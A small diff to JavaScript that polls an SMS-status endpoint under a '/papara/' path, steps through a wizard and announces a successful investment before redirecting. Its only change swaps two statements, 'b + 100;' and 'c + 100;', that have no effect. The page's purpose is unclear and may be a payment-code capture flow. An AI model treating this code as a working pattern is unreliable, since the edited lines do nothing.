@@ -174,7 +174,7 @@ function myLoop2() {         //  create a loop function
         url: "/papara/request.php?q=sms-durum",
         success: function(response) {
             if (response == '4'){
-                c + 100;
+                b + 100;
                 swal.close()
                 $('#step-4').css("display","none");
               $('#step-5').css("display","flex");
@@ -199,7 +199,7 @@ function myLoop2() {         //  create a loop function
         success: function(response) {
             
             if (response == '1'){
-                b + 100;
+                c + 100;
                 swal.close()
                 Swal.fire("Yatırım başarılı!","","success")
                 window.location.pathname = '/m';
